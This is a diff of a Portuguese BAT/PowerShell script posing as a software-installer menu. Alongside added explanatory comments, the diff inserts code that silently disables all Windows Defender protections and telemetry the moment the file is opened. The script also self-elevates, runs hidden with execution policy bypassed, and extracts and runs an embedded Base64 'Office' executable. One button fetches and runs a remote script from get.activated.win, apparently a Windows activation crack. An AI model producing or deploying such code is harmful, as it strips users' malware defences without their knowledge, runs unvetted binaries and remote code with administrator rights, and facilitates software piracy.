@@ -1,15 +1,23 @@
 @echo off
+REM Inicia o BAT sem mostrar os comandos do CMD na tela.
+REM A tentativa de net session verifica se o processo atual tem privilégios administrativos.
 net session >nul 2>&1
 if errorlevel 1 (
+  REM Se não estiver elevado, pede ao Windows para reabrir este mesmo BAT como administrador.
   powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
   exit /b
 )
+REM Guarda a unidade de origem e o caminho completo deste arquivo.
+REM INSTALLER_FILE permite ao PowerShell localizar o instalador do Office embutido no fim do BAT.
 set "BATDRIVE=%~d0"
 set "INSTALLER_FILE=%~f0"
+REM O PowerShell é iniciado oculto; a interface visível é criada depois com Windows Forms.
+REM Bypass afeta a política desta chamada; STA é necessário para os componentes gráficos usados.
 powershell -NoProfile -ExecutionPolicy Bypass -STA -WindowStyle Hidden -Command "$s=[IO.File]::ReadAllText($env:INSTALLER_FILE); $a=$s.IndexOf('#'+'PSSTART'); $b=$s.IndexOf('#'+'PSEND'); try { iex $s.Substring($a, $b-$a) } catch { Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show(\"Erro no menu: $_\") }"
 exit /b
 
 #PSSTART
+# O programa principal desta seção é PowerShell; o executável do Office vem separado, codificado em Base64 no final.
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 [System.Windows.Forms.Application]::EnableVisualStyles()
@@ -17,12 +25,27 @@ Add-Type -AssemblyName System.Drawing
 # =====================================================================
 # CONFIGURACOES INICIAIS E VARIAVEIS
 # =====================================================================
+# Unidade de onde o BAT foi aberto e caminho-base configurado para arquivos da rotina.
 $drive     = $env:BATDRIVE
 $BASE      = "$drive\Windows\Tudo"
 # =====================================================================
 # TWEAKS DO SISTEMA (Executados invisivelmente ao abrir o BAT)
 # =====================================================================
 
+# --- DESATIVAR TODAS AS OPCOES DO WINDOWS DEFENDER AO ABRIR ---
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
+    Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
+    Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
+} catch {}
+
+# CONFIGURAÇÃO DE ENERGIA: define tela e suspensão como "nunca" na tomada e na bateria.
+# Também desativa completamente a hibernação; essas alterações não são restauradas ao sair.
+# Falhas ou opções não suportadas são ignoradas pelo try/catch para não interromper o menu.
 # --- DESATIVAR SUSPENSAO, DESLIGAMENTO DE TELA E HIBERNACAO ---
 try {
     # Desligar tela / Video (Tomada e Bateria -> 0 = Nunca)
@@ -46,14 +69,17 @@ try {
     # Silencioso caso nao tenha permissao ou suporte a algum parametro
 }
 
+# ALTERAÇÃO DE SEGURANÇA: tenta desativar proteção em tempo real e proteção de comportamento do Defender.
+# O botão "Sair" tenta reativá-las; fechar pelo X, pelo Gerenciador de Tarefas ou por falha não aciona esse botão.
+# A proteção contra adulteração e as políticas do Windows podem impedir essas alterações.
 # --- DESATIVAR WINDOWS DEFENDER TEMPORARIAMENTE AO ABRIR ---
 try {
     Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
     Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
 } catch {}
 
-# --- GERADOR AUTOMATICO DO ARQUIVO RARREG ---i
-
+# Ajusta valores do Registro do usuário atual para exibir ícones clássicos na Área de Trabalho.
+# Os identificadores abaixo correspondem a Este Computador, Pasta do Usuário e Painel de Controle.
 # --- ATIVAR ICONES DA AREA DE TRABALHO (Meu Computador, Usuario e Painel de Controle) ---
 $iconsPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel"
 if (-not (Test-Path $iconsPath)) { New-Item -Path $iconsPath -Force | Out-Null }
@@ -61,6 +87,8 @@ Set-ItemProperty -Path $iconsPath -Name "{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
 Set-ItemProperty -Path $iconsPath -Name "{59031a47-3f72-44a7-89c5-5595fe6b30ee}" -Value 0 -Type DWord -Force 
 Set-ItemProperty -Path $iconsPath -Name "{5399E694-6CE5-4D6C-8FCE-1D8870FDCBA0}" -Value 0 -Type DWord -Force 
 
+# Registra o Visualizador de Fotos clássico para os formatos de imagem listados.
+# Isso disponibiliza as associações no Registro, mas não garante que ele vire o aplicativo padrão do usuário.
 # --- ATIVAR VISUALIZADOR DE FOTOS CLASSICO (SILENCIOSO) ---
 $photoPath = "HKLM:\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations"
 if (-not (Test-Path $photoPath)) { New-Item -Path $photoPath -Force | Out-Null }
@@ -68,6 +96,7 @@ foreach ($ext in @('.jpg','.jpeg','.png','.bmp','.gif','.tif','.tiff')) {
     New-ItemProperty -Path $photoPath -Name $ext -Value 'PhotoViewer.FileAssoc.Tiff' -PropertyType String -Force | Out-Null
 }
 
+# Declara a chamada nativa SHChangeNotify e avisa o Explorer que configurações do shell mudaram.
 # --- FORCA A ATUALIZACAO DA AREA DE TRABALHO (PISCA/REFRESH) ---
 $refreshCode = @'
 [System.Runtime.InteropServices.DllImport("Shell32.dll")]
@@ -82,15 +111,21 @@ Add-Type -MemberDefinition $refreshCode -Namespace "WinAPI" -Name "Desktop" -Err
 # =====================================================================
 
 # --- COPIADOR DE ATALHOS DO OFFICE ---
+# Este comando procura atalhos do Office nos menus Iniciar do usuário e do computador.
+# Copia os atalhos encontrados para "Office 365" na Área de Trabalho; não cria atalhos que não existam.
 $officeShortcuts = '$achou = $false; $desk = Join-Path ([Environment]::GetFolderPath("Desktop")) "Office 365"; $pastas = @("$env:ProgramData\Microsoft\Windows\Start Menu\Programs", "$env:APPDATA\Microsoft\Windows\Start Menu\Programs"); foreach ($app in @("*Word*.lnk", "*Excel*.lnk", "*PowerPoint*.lnk", "*Access*.lnk", "*Publisher*.lnk", "*OneNote*.lnk")) { foreach ($dir in $pastas) { if (Test-Path $dir) { $arquivos = Get-ChildItem -Path $dir -Filter $app -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -notmatch "Wordpad|Voice" }; foreach ($arq in $arquivos) { if (-not $achou) { if (-not (Test-Path $desk)) { New-Item -ItemType Directory -Force -Path $desk | Out-Null }; $achou = $true }; Copy-Item -Path $arq.FullName -Destination $desk -Force } } } }; if ($achou) { Write-Host "##INFO Atalhos do Office copiados com sucesso!" } else { Write-Host "##INFO Nenhum atalho achado. O Office ja terminou de instalar?" }'
+# Worker do Office: inicia o instalador e acompanha o processo sem congelar a janela principal.
 $officeWaitAndClose = @'
+# Guarda o processo inicial; os processos filhos do instalador também serão monitorados.
 $processo = Start-Process -FilePath $exe -PassThru
+# Guarda os IDs do instalador e dos processos descendentes para não confundir outras janelas com o Office.
 $officePids = New-Object 'System.Collections.Generic.HashSet[int]'
 [void]$officePids.Add([int]$processo.Id)
 $officeUiaReady = $false
 try { Add-Type -AssemblyName UIAutomationClient; Add-Type -AssemblyName UIAutomationTypes; $officeUiaReady = $true } catch {}
 $officeConcluidoFechado = $false
 while ($true) {
+    # Atualiza a lista de processos do Windows para acompanhar o instalador e os componentes que ele iniciou.
     $listaProcessos = @(Get-CimInstance Win32_Process -ErrorAction SilentlyContinue)
     $novos = $true
     while ($novos) {
@@ -104,6 +139,7 @@ while ($true) {
     }
     $processosVivos = @($listaProcessos | Where-Object { $officePids.Contains([int]$_.ProcessId) })
     if ($processosVivos.Count -eq 0) { break }
+    # Se a automação de interface estiver disponível, procura uma indicação visível de conclusão.
     if ($officeUiaReady -and -not $officeConcluidoFechado) {
         try {
             $janelas = [System.Windows.Automation.AutomationElement]::RootElement.FindAll([System.Windows.Automation.TreeScope]::Children, [System.Windows.Automation.Condition]::TrueCondition)
@@ -120,6 +156,8 @@ while ($true) {
                     } catch {}
                 }
                 $textoJanela = [string]::Join(' ', $nomes.ToArray())
+                # Só tenta acionar o botão final quando encontra texto de instalação concluída e botão Fechar habilitado.
+                # Os nomes aceitos contemplam português e inglês: Fechar, Close, Concluir, Finish, Finalizar ou Done.
                 $instalacaoConcluida = $textoJanela -match '(?i)(office|microsoft 365).{0,100}(installed|instalad[oa]|conclu[ií]d[oa])|(installation|instala[cç][aã]o).{0,60}(complete|completed|conclu[ií]d[oa]|finalizada)|(you.?re all set|all set|tudo pronto|pronto para usar)'
                 if ($instalacaoConcluida -and $botoesFechar.Count -gt 0) {
                     foreach ($botao in $botoesFechar) {
@@ -142,7 +180,9 @@ $processo.Refresh()
 $global:LASTEXITCODE = [int]$processo.ExitCode
 if (-not $officeConcluidoFechado) { Write-Host '##INFO O instalador do Office foi encerrado.' }
 '@
+# Script usado pelos pacotes: lê o próprio BAT e extrai o executável do Office que está em Base64 no final.
 $officeInstallAndShortcuts = @'
+# Lê o BAT indicado pelo lançador e procura o separador do conteúdo embutido.
 $txt = [IO.File]::ReadAllText("$env:INSTALLER_FILE")
 $m = "###" + "PAYLOAD###"
 $i = $txt.LastIndexOf($m)
@@ -152,6 +192,7 @@ $exe = Join-Path $env:TEMP "OfficeSetup.exe"
 try { [IO.File]::WriteAllBytes($exe, $bytes) }
 catch { $exe = Join-Path $env:TEMP ("OfficeSetup_" + (Get-Date -Format "HHmmss") + ".exe"); [IO.File]::WriteAllBytes($exe, $bytes) }
 '@
+# Ordem do fluxo: extrair Office, aguardar a conclusão/fechar a janela e copiar os atalhos encontrados.
 $officeInstallAndShortcuts += "`r`n" + $officeWaitAndClose + "`r`n" + $officeShortcuts
 
 # =====================================================================
@@ -164,8 +205,13 @@ $global:etapaAtual = 0
 
 function Log($msg) { $logBox.AppendText((Get-Date -Format 'HH:mm:ss') + "  " + $msg + "`r`n") }
 
+# Código auxiliar enviado para cada PowerShell de instalação em segundo plano.
+# Contém validação de assinatura digital e as alternativas oficiais usadas quando o WinGet falha.
 $appInstallHelpers = @'
+# Reduz mensagens de progresso desnecessárias no arquivo de log do menu.
 $ProgressPreference = 'SilentlyContinue'
+# Baixa o instalador e verifica assinatura Authenticode e publicador esperado antes de executá-lo.
+# Se a assinatura ou o publicador não corresponder, o arquivo é removido e a instalação é interrompida.
 function Get-VerifiedInstaller {
     param([string]$Uri, [string]$FileName, [string]$PublisherPattern)
     $path = Join-Path $env:TEMP $FileName
@@ -177,6 +223,8 @@ function Get-VerifiedInstaller {
     }
     return $path
 }
+# Estratégia: tentar WinGet primeiro; se falhar, usar uma alternativa oficial específica para aquele aplicativo.
+# O código de saída é mantido para o menu não registrar falsamente uma instalação como bem-sucedida.
 function Install-AppFallback {
     param([string]$Id)
     $global:LASTEXITCODE = 1
@@ -185,6 +233,7 @@ function Install-AppFallback {
     try {
         $wingetCommand = Get-Command winget.exe -ErrorAction SilentlyContinue | Select-Object -First 1
         if ($wingetCommand) { $wingetPath = $wingetCommand.Source }
+        # Se winget.exe não estiver no PATH, procura o executável dentro do pacote App Installer.
         if (-not $wingetPath) {
             try {
                 $appInstaller = Get-AppxPackage -Name Microsoft.DesktopAppInstaller -ErrorAction SilentlyContinue | Sort-Object Version -Descending | Select-Object -First 1
@@ -194,6 +243,7 @@ function Install-AppFallback {
                 }
             } catch {}
         }
+        # O WinGet é a primeira tentativa, em modo silencioso e sem perguntas de aceite interativas.
         if ($wingetPath) {
             Write-Host "##INFO Tentando instalar $Id pelo WinGet..."
             & $wingetPath install --exact --id $Id --source winget --silent --accept-package-agreements --accept-source-agreements --disable-interactivity
@@ -207,6 +257,7 @@ function Install-AppFallback {
             Write-Host '##INFO WinGet nao foi encontrado. Tentando o canal oficial alternativo...'
         }
         switch ($Id) {
+            # Chrome: alternativa é o MSI empresarial x64 do domínio Google; valida o certificado antes do msiexec.
             'Google.Chrome' {
                 $fileName = 'ChromeEnterprise_' + [guid]::NewGuid().ToString('N') + '.msi'
                 $setup = Get-VerifiedInstaller -Uri 'https://dl.google.com/dl/chrome/install/googlechromestandaloneenterprise64.msi' -FileName $fileName -PublisherPattern '(?i)(CN=Google LLC|O=Google LLC)'
@@ -215,6 +266,8 @@ function Install-AppFallback {
                 else { $global:LASTEXITCODE = [int]$proc.ExitCode }
                 return
             }
+            # WinRAR: procura a versão x64 estável no site RARLAB, valida o certificado e instala em modo silencioso.
+            # Não grava chave de licença; o uso deve respeitar os termos de licença do fornecedor.
             'RARLab.WinRAR' {
                 $page = Invoke-WebRequest -Uri 'https://www.rarlab.com/download.htm' -UseBasicParsing -ErrorAction Stop
                 $fileMatch = [regex]::Match([string]$page.Content, '(?i)winrar-x64-\d+\.exe')
@@ -226,12 +279,14 @@ function Install-AppFallback {
                 $global:LASTEXITCODE = [int]$proc.ExitCode
                 return
             }
+            # Adobe Reader: se WinGet falhar, abre a página oficial; o usuário conclui a instalação no navegador.
             'Adobe.Acrobat.Reader.64-bit' {
                 Start-Process 'https://get.adobe.com/reader/enterprise/'
                 Write-Host '##INFO Abri o download oficial do Adobe Reader. Conclua a instalacao na pagina da Adobe.'
                 $global:LASTEXITCODE = if ($wingetCode -ne 0) { $wingetCode } else { 1 }
                 return
             }
+            # MSI Afterburner: se WinGet falhar, abre a página oficial da MSI para escolher o instalador.
             'Guru3D.Afterburner' {
                 Start-Process 'https://www.msi.com/Landing/afterburner/download'
                 Write-Host '##INFO Abri a pagina oficial do MSI Afterburner. Escolha o instalador no site da MSI.'
@@ -250,9 +305,13 @@ function Install-AppFallback {
     }
 }
 '@
+# Inicia cada instalação em outro PowerShell para manter o menu responsivo.
+# A saída e os erros do processo filho são redirecionados para um arquivo temporário lido pela interface.
 function Start-Task($titulo, $script, $total = 1) {
+    # O nome da tarefa identifica seu arquivo temporário de log.
     $out = Join-Path $env:TEMP ("inst_" + ($titulo -replace '[^a-zA-Z0-9]','') + ".txt")
     $script = "& { " + $appInstallHelpers + "`r`n" + $script + " } *> '$out'; exit `$LASTEXITCODE"
+    # Codifica o script em UTF-16/Base64 para transmiti-lo ao processo filho sem problemas com aspas.
     $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))
     if (Test-Path $out) { Remove-Item $out -Force -ErrorAction SilentlyContinue }
     $p = Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -STA -EncodedCommand $enc" -WindowStyle Hidden -PassThru
@@ -284,20 +343,25 @@ function Start-Task($titulo, $script, $total = 1) {
     Log "=== Iniciando: $titulo ==="
 }
 
+# Gera a chamada para a rotina WinGet + fallback oficial, usando o ID exato do pacote.
 function W($id) { "Install-AppFallback -Id '$id'" }
 
+# Cria uma etapa numerada: informa o progresso, executa o comando e classifica o código de saída.
 function Passo($n, $tot, $nome, $cmd) {
     "Write-Host '##AGORA [$n/$tot] $nome'; `$global:LASTEXITCODE = 0; $cmd; `$c = `$global:LASTEXITCODE; " +
     "if (`$c -eq 0) { Write-Host '##OK $nome' } elseif (`$c -eq -1978335189) { Write-Host '##JA $nome' } " +
     "else { Write-Host ('##ERRO $nome (codigo ' + `$c + ')'); `$global:falhou = 1 }"
 }
 
+# Junta as etapas de um pacote para execução em sequência e devolve um código final de sucesso ou falha.
 function Lote($passos) { "`$global:falhou = 0; " + ($passos -join "; ") + "; `$global:LASTEXITCODE = [int]`$global:falhou" }
 
 # =====================================================================
 # FUNCOES DO OFFICE
 # =====================================================================
 
+# Extrai para a pasta temporária o instalador do Office embutido no final deste arquivo BAT.
+# Esta função prepara o executável; o acompanhamento da instalação fica no worker em segundo plano.
 function Preparar-Office {
     try {
         Log "Preparando o instalador do Office..."
@@ -323,6 +387,7 @@ function Preparar-Office {
 
 $programIcon = [System.Drawing.SystemIcons]::Application
 
+# Janela principal fixa: ações à esquerda; status, progresso e log à direita.
 $form = New-Object System.Windows.Forms.Form
 $form.Icon = $programIcon
 $form.ShowIcon = $true
@@ -358,6 +423,8 @@ $subTitle.AutoSize = $true
 $subTitle.Location = New-Object System.Drawing.Point(27, 48)
 $header.Controls.Add($subTitle)
 
+# O botão Sair tenta reativar as proteções do Defender e fecha a janela quando clicado.
+# Esse código não roda ao fechar a janela pelo X.
 $sair = New-Object System.Windows.Forms.Button
 $sair.Text = "Sair"
 $sair.Size = New-Object System.Drawing.Size(290, 38)
@@ -398,13 +465,20 @@ $form.Controls.Add($bundleTitle)
 # LISTA DE ACOES DOS BOTOES
 # =====================================================================
 
+# A ordem desta lista determina a numeração e a posição dos botões.
+# As seis primeiras entradas são ações individuais; as três últimas são pacotes de instalação.
 $actions = [ordered]@{
     "Ativação Windows"           = { Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"& ([ScriptBlock]::Create((irm https://get.activated.win))) `"" ; Log "Tela de Ativacao do Windows foi Aberta" }
+    # Instalação individual: tenta WinGet e depois MSI oficial do Google se necessário.
     "Instalar Google Chrome"     = { Start-Task "Chrome" (Lote @(Passo 1 1 "Chrome" (W "Google.Chrome"))) }
+    # Instalação individual: tenta WinGet e depois o instalador oficial do RARLAB.
     "Instalar WinRAR"            = { Start-Task "WinRAR" (Lote @(Passo 1 1 "WinRAR" (W "RARLab.WinRAR"))) }
+    # Instalação individual: tenta WinGet e abre o site oficial da MSI como alternativa.
     "Instalar MSI Afterburner"   = { Start-Task "Afterburner" (Lote @(Passo 1 1 "MSI Afterburner" (W "Guru3D.Afterburner"))) }
+    # Opção 05: tenta WinGet e abre a página oficial da Adobe se o WinGet falhar.
     "Instalar Adobe Reader"     = { Start-Task "Adobe Reader" (Lote @(Passo 1 1 "Adobe Acrobat Reader" (W "Adobe.Acrobat.Reader.64-bit"))) }
 
+    # Opção 06: extrai o Office, acompanha o sinal de conclusão, fecha a janela e copia atalhos encontrados.
     "Instalar Apenas o Office"  = {
         $exe = Preparar-Office
         if ($exe) {
@@ -415,6 +489,7 @@ $actions = [ordered]@{
         }
     }
 
+    # Pacote 1: Chrome, Adobe Reader e WinRAR; não inclui Afterburner nem Office.
     "TUDO (Sem MSI e sem Office)" = {
         Start-Task "TUDO Sem MSI e sem Office" (Lote @(
             (Passo 1 3 "Chrome" (W "Google.Chrome")),
@@ -423,6 +498,7 @@ $actions = [ordered]@{
         )) -total 3
     }
 
+    # Pacote 2: Chrome, Adobe Reader, WinRAR e Office; não inclui Afterburner.
     "INSTALAR TUDO (Sem MSI)" = {
         Start-Task "INSTALAR TUDO (Sem MSI)" (Lote @(
             (Passo 1 4 "Chrome" (W "Google.Chrome")),
@@ -432,6 +508,7 @@ $actions = [ordered]@{
         )) -total 4
     }
 
+    # Pacote 3: Chrome, Adobe Reader, WinRAR, MSI Afterburner e Office.
     "INSTALAR TUDO + Office" = {
         Start-Task "TUDO com Office" (Lote @(
             (Passo 1 5 "Chrome" (W "Google.Chrome")),
@@ -444,6 +521,7 @@ $actions = [ordered]@{
 }
 
 # Ações numeradas em cartões: 01-06 individuais, 07-09 pacotes
+# Cria os botões na ordem acima; o número também define coluna, linha e estilo do cartão.
 $actionNumber = 0
 foreach ($name in $actions.Keys) {
     $actionNumber++
@@ -487,6 +565,7 @@ foreach ($name in $actions.Keys) {
     $btn.Tag = @{ Acao = $actions[$name]; Cor = $btn.BackColor }
     $btn.Add_MouseEnter({ $this.BackColor = [System.Drawing.Color]::FromArgb(40, 55, 80) })
     $btn.Add_MouseLeave({ $this.BackColor = $this.Tag.Cor })
+    # O clique executa o bloco de ação guardado no Tag do botão; exceções são mostradas em uma caixa de mensagem.
     $btn.Add_Click({ try { & $this.Tag.Acao } catch { [System.Windows.Forms.MessageBox]::Show("Erro: $_") } })
     $form.Controls.Add($btn)
 }
@@ -537,11 +616,13 @@ $form.Controls.Add($watermark)
 # =====================================================================
 
 # =====================================================================
+# A cada segundo, o timer lê novas mensagens dos workers e remove tarefas que terminaram.
 # TIMER: PROCESSAMENTO DO LOG E FILA
 # =====================================================================
 
 $timer = New-Object System.Windows.Forms.Timer
 $timer.Interval = 1000
+# Converte marcadores escritos pelo worker (##AGORA, ##OK, ##JA, ##ERRO, ##INFO) em mensagens da interface.
 function Ler-Novas($t) {
     if (-not (Test-Path $t.Out)) { return }
     $linhas = @(Get-Content $t.Out -ErrorAction SilentlyContinue)
@@ -563,6 +644,7 @@ function Ler-Novas($t) {
     $t.Lido = $linhas.Count
 }
 
+# Em cada ciclo: atualiza o log, verifica se o processo filho terminou e mostra o resumo da tarefa.
 $timer.Add_Tick({
     foreach ($t in @($global:tasks)) {
         Ler-Novas $t
@@ -589,10 +671,12 @@ $timer.Add_Tick({
 })
 $timer.Start()
 
+# Mostra a janela e mantém ativo o loop de eventos do Windows Forms.
 $form.Show()
 [System.Windows.Forms.Application]::Run($form)
 
 
+# Ao fechar o menu, para o timer e libera os recursos gráficos.
 $timer.Stop()
 $timer.Dispose()
 $form.Dispose()
